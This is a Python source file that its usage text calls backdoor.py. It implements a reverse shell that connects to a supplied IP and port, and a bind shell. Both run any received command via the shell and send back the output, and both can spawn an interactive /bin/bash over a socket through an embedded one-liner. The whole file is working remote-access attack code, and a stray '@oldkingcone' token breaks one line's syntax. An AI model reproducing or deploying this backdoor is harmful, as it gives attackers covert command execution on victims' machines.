from __future__ import print_function
import socket
import sys
import subprocess
import os
import re
import time


def rvrscnnct(ip, port):
    try:
        rvrscnct = socket.socket()
        rvrscnct.connect((ip, int(port)))
        rvrscnct.settimeout(2)
        output = subprocess.Popen(['hostname -I'], shell=True, stdout=subprocess.PIPE)
        a = output.stdout.read()
        ip_candidates = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", str(a))[0]
        host = str.encode('[*] SESSION CREATED ' + ip_candidates)
        rvrscnct.send(host)
        while True:
            try:
                command = rvrscnct.recv(5120).decode('utf-8')
                if "exit" in command:
                    rvrscnct.close()
                    sys.exit(1)

                elif ("cd" == command[:2]):
                    os.chdir(command[3:])
                    aq = os.getcwd()
                    rvrscnct.send(aq.encode('utf-8'))
                elif "interactive_shell" in command:
                    time.sleep(2)
                    os.system(
                        """python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' """.format(
                            ip_candidates, int(command[17:])))
                else:
                    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                              stdin=subprocess.PIPE)
                    rvrscnct.sendall(bytes(output.stdout.read()))
                    rvrscnct.sendall(bytes(output.stderr.read()))

            except socket.timeout:
                pass
            except IOError as a:
                ioerror = str.encode("[-] Directory Not Found")
                rvrscnct.send(ioerror)
                pass
    except ConnectionRefusedError:
        print("[-] Connection error")
    except Exception as f:
        print(f.message)
    except KeyboardInterrupt:
        print("[-] The connection was forcibly closed")
        try:
            rvrscnct.close()
        except UnboundLocalError:
            pass
        sys.exit(1)


def bndcnnct(port):
    try:
        output = subprocess.Popen(['hostname -I'], shell=True, stdout=subprocess.PIPE)
        ip2 = output.stdout.read()
        ip_candidates = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", str(ip2))[0]
        bindshell = socket.socket()
        bindshell.bind((ip_candidates, int(port)))
        bindshell.listen(2)
        a, b = bindshell.accept()
        host = str.encode('[*] SESSION CREATED ' + ip_candidates)
        a.send(host)
        a.settimeout(2)
        while True:
            try:
                command = a.recv(5120).decode('utf-8')
                if "exit" in command:
                    a.close()
                    sys.exit(1)
                elif ("cd" == command[:2]):
                    os.chdir(command[3:])
                    aq = os.getcwd()
                    a.send(aq.encode('utf-8'))
                elif "interactive_shell" == command[:17]:
                    os.system(
                        """ python -c 'import pty;import socket,os;s=socket.socket();s.bind(("{}",{}));s.listen(1);q,w=s.accept();os.dup2(q.fileno(),0);os.dup2(q.fileno(),1);os.dup2(q.fileno(),2);pty.spawn("/bin/bash")' """.format(
                            ip_candidates, int(command[17:])))
                else:
                    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                              stdin=subprocess.PIPE)
                    a.sendall(bytes(output.stdout.read()))
                    a.sendall(bytes(output.stderr.read()))
            except socket.timeout:
                pass
            except IOError:
                ioerror = str.encode("[-] Directory Not Found")
                a.send(ioerror)
                pass
    except ConnectionRefusedError:
        print("[-] Connection error")
    except Exception as f:
        print(f.message)

    except KeyboardInterrupt:
        print("[-] The connection was forcibly closed")
        try:
            a.close()
        except UnboundLocalError:
            pass
        sys.exit(1)


if __name__ == '__main__':
    if len(sys.argv) < 3:@oldkingcone
        print("[-] Missing Parameter")
        print('Usage ./backdoor.py --l <PORT>')
        print('Usage ./backdoor.py --c <Ip> <PORT>')
    elif ("--l" in sys.argv[1]):
        bndcnnct(sys.argv[2])
    elif ("--c" in sys.argv[1]):
        rvrscnnct(sys.argv[2], sys.argv[3])
        #not trying to steal this and not give credit, just needed to temp add this, and add some python2 functionality. sorry.
        
        
        
